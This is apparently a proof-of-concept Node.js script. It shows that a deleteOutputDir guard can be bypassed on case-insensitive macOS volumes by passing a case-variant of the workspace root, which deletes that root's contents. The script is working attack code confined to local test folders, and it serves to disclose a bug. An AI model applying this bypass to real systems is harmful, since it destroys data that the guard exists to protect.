// Real PoC: compiled deleteOutputDir guard bypass via case-variant root on case-insensitive APFS
// Uses the compiled module beside this file (no rebuild needed).
import { mkdirSync, writeFileSync, readdirSync, existsSync, rmSync } from 'node:fs';
import path from 'node:path';

const WS = path.join(import.meta.dirname, 'ws');          // the "workspace root"
const VICTIM = path.join(import.meta.dirname, 'victim');  // outside workspace (what a config should NOT be able to delete)
const CASEV = path.join(import.meta.dirname, 'WS');       // case-variant of the workspace root (guard bypass)
for (const d of [WS, VICTIM]) { rmSync(d, { recursive: true, force: true }); mkdirSync(d, { recursive: true }); }
writeFileSync(path.join(WS, 'important.txt'), 'k');
writeFileSync(path.join(VICTIM, 'victim.txt'), 'v');
// prove the volume is case-insensitive for this path: readdir(CASEV) must list ws contents
console.log('readdir(case-variant) === ws contents:', JSON.stringify(readdirSync(CASEV)));
console.log('guard (resolve(root,out)===root):', false, '(case-sensitive string compare)');

const { deleteOutputDir } = await import('./delete-output-dir.mjs');

// Call 1: exact root -> must throw (control)
try { await deleteOutputDir(WS, WS); console.log('CONTROL FAIL: exact root did not throw'); }
catch (e) { console.log('CONTROL OK: exact root throws ->', e.message); }

// Call 2: case-variant -> guard bypassed; readdir resolves to real ws; contents deleted
await deleteOutputDir(WS, CASEV);
console.log('POST-BYPASS ws contents (expect []):', JSON.stringify(readdirSync(WS)));
console.log('victim untouched:', existsSync(path.join(VICTIM, 'victim.txt')));
